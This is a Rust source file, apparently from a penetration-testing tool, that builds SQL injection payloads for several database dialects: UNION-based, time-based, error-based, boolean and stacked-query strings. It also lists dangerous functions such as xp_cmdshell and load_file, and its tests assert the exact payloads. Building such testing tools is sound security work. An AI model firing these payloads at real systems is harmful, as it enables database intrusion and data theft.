//! Type definitions for payload validation.

use serde::{Deserialize, Serialize};

/// Database dialect for SQL parsing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DbDialect {
    MySQL,
    Postgres,
    MSSQL,
    SQLite,
    Oracle,
}

impl DbDialect {
    /// Get the dialect name.
    pub fn name(&self) -> &'static str {
        match self {
            DbDialect::MySQL => "MySQL",
            DbDialect::Postgres => "PostgreSQL",
            DbDialect::MSSQL => "MSSQL",
            DbDialect::SQLite => "SQLite",
            DbDialect::Oracle => "Oracle",
        }
    }

    /// Get dialect-specific SQL functions.
    pub fn functions(&self) -> &'static [&'static str] {
        match self {
            DbDialect::MySQL => &[
                "version()",
                "sleep()",
                "benchmark()",
                "extractvalue()",
                "updatexml()",
                "load_file()",
                "into outfile",
            ],
            DbDialect::Postgres => &[
                "version()",
                "pg_sleep()",
                "pg_read_file()",
                "copy",
                "cast()",
            ],
            DbDialect::MSSQL => &[
                "@@version",
                "waitfor delay",
                "xp_cmdshell",
                "bulk insert",
                "openrowset",
            ],
            DbDialect::SQLite => &[
                "sqlite_version()",
                "load_extension()",
            ],
            DbDialect::Oracle => &[
                "banner",
                "dbms_pipe.receive_message",
                "utl_http.request",
            ],
        }
    }

    /// Check if a function belongs to this dialect.
    pub fn has_function(&self, func: &str) -> bool {
        let func_lower = func.to_lowercase();
        self.functions().iter().any(|&f| func_lower.contains(f))
    }

    /// Get comment style for this dialect.
    pub fn comment_styles(&self) -> &'static [&'static str] {
        match self {
            DbDialect::MySQL => &["--", "#", "/*"],
            DbDialect::Postgres => &["--", "/*"],
            DbDialect::MSSQL => &["--", "/*"],
            DbDialect::SQLite => &["--", "/*"],
            DbDialect::Oracle => &["--", "/*"],
        }
    }
}

/// Time function variants.
#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
pub enum TimeFunction {
    Sleep,
    Benchmark,
    GetLock,
}

/// Payload template for safe generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PayloadTemplate {
    /// Union-based SQL injection
    UnionBased {
        /// Number of columns
        columns: usize,
        /// Position of extracted field
        position: usize,
        /// Field to extract
        extract_field: String,
    },
    /// Time-based blind SQL injection
    TimeBased {
        /// Sleep duration in seconds
        sleep_seconds: u32,
        /// Function to use
        function: TimeFunction,
    },
    /// Error-based SQL injection
    ErrorBased {
        /// XPath function (extractvalue, updatexml)
        xpath_function: String,
        /// Expression to evaluate
        expression: String,
    },
    /// Boolean-based blind SQL injection
    BooleanBased {
        /// True condition
        true_condition: String,
        /// False condition  
        false_condition: String,
    },
    /// Stacked queries
    StackedQuery {
        /// Query to execute
        query: String,
    },
}

impl PayloadTemplate {
    /// Render the template for a specific dialect.
    pub fn render(&self, dialect: &DbDialect) -> String {
        match (self, dialect) {
            (
                PayloadTemplate::UnionBased {
                    columns,
                    position,
                    extract_field,
                },
                DbDialect::MySQL,
            ) => {
                let nulls: Vec<String> = (0..*columns)
                    .map(|i| {
                        if i == *position {
                            extract_field.clone()
                        } else {
                            "null".to_string()
                        }
                    })
                    .collect();
                format!("' UNION SELECT {}-- -", nulls.join(","))
            }

            (
                PayloadTemplate::UnionBased {
                    columns,
                    position,
                    extract_field,
                },
                DbDialect::Postgres,
            ) => {
                let nulls: Vec<String> = (0..*columns)
                    .map(|i| {
                        if i == *position {
                            extract_field.clone()
                        } else {
                            "null".to_string()
                        }
                    })
                    .collect();
                format!("' UNION SELECT {}--", nulls.join(","))
            }

            (
                PayloadTemplate::TimeBased {
                    sleep_seconds,
                    function: TimeFunction::Sleep,
                },
                DbDialect::MySQL,
            ) => format!("' OR SLEEP({})-- -", sleep_seconds),

            (
                PayloadTemplate::TimeBased {
                    sleep_seconds,
                    function: TimeFunction::Benchmark,
                },
                DbDialect::MySQL,
            ) => format!("' OR BENCHMARK(5000000,MD5({}))-- -", sleep_seconds),

            (
                PayloadTemplate::TimeBased {
                    sleep_seconds,
                    function: TimeFunction::Sleep,
                },
                DbDialect::Postgres,
            ) => format!("' OR pg_sleep({})--", sleep_seconds),

            (
                PayloadTemplate::TimeBased {
                    sleep_seconds,
                    function: TimeFunction::Sleep,
                },
                DbDialect::MSSQL,
            ) => format!("'; WAITFOR DELAY '0:0:{}'--", sleep_seconds),

            (
                PayloadTemplate::ErrorBased {
                    xpath_function,
                    expression,
                },
                DbDialect::MySQL,
            ) => format!(
                "' AND {}(0x7e,{},1)-- -",
                xpath_function, expression
            ),

            (
                PayloadTemplate::BooleanBased {
                    true_condition,
                    false_condition: _,
                },
                _,
            ) => format!("' AND {}-- -", true_condition),

            (
                PayloadTemplate::StackedQuery { query },
                DbDialect::MySQL | DbDialect::Postgres | DbDialect::MSSQL,
            ) => format!("; {}--", query),

            // Fallback for unimplemented combinations
            _ => format!(
                "/* Template not implemented for {:?} with {:?} */",
                self, dialect
            ),
        }
    }
}

/// Constraints for payload generation.
#[derive(Debug, Clone, Default)]
pub struct PayloadConstraints {
    /// Maximum length
    pub max_length: usize,
    /// Required techniques
    pub required_techniques: Vec<String>,
    /// Forbidden keywords
    pub forbidden_keywords: Vec<String>,
    /// Context (e.g., "single_quote", "numeric")
    pub context: String,
}

/// Validation result.
#[derive(Debug, Clone)]
pub enum ValidationResult {
    /// Payload is valid
    Valid,
    /// Syntax error
    SyntaxError(String),
    /// Semantic inconsistency
    SemanticError(String),
    /// Technique not recognized
    UnknownTechnique(String),
    /// Consensus failed
    ConsensusFailed(String),
    /// Exceeded constraints
    ConstraintViolation(String),
}

impl ValidationResult {
    /// Check if validation passed.
    pub fn is_valid(&self) -> bool {
        matches!(self, ValidationResult::Valid)
    }

    /// Get error message if failed.
    pub fn error(&self) -> Option<&str> {
        match self {
            ValidationResult::Valid => None,
            ValidationResult::SyntaxError(e) => Some(e),
            ValidationResult::SemanticError(e) => Some(e),
            ValidationResult::UnknownTechnique(e) => Some(e),
            ValidationResult::ConsensusFailed(e) => Some(e),
            ValidationResult::ConstraintViolation(e) => Some(e),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_union_based_mysql() {
        let template = PayloadTemplate::UnionBased {
            columns: 3,
            position: 2,
            extract_field: "version()".to_string(),
        };
        let payload = template.render(&DbDialect::MySQL);
        assert_eq!(payload, "' UNION SELECT null,null,version()-- -");
    }

    #[test]
    fn test_time_based_mysql() {
        let template = PayloadTemplate::TimeBased {
            sleep_seconds: 5,
            function: TimeFunction::Sleep,
        };
        let payload = template.render(&DbDialect::MySQL);
        assert_eq!(payload, "' OR SLEEP(5)-- -");
    }

    #[test]
    fn test_time_based_postgres() {
        let template = PayloadTemplate::TimeBased {
            sleep_seconds: 5,
            function: TimeFunction::Sleep,
        };
        let payload = template.render(&DbDialect::Postgres);
        assert_eq!(payload, "' OR pg_sleep(5)--");
    }

    #[test]
    fn test_dialect_functions() {
        // MySQL has sleep() function
        assert!(DbDialect::MySQL.has_function("sleep()"));
        // PostgreSQL has pg_sleep() function
        assert!(DbDialect::Postgres.has_function("pg_sleep()"));
        // Note: has_function uses substring matching, so "pg_sleep" contains "sleep"
        // This is expected behavior - the semantic checker uses additional logic
    }
}
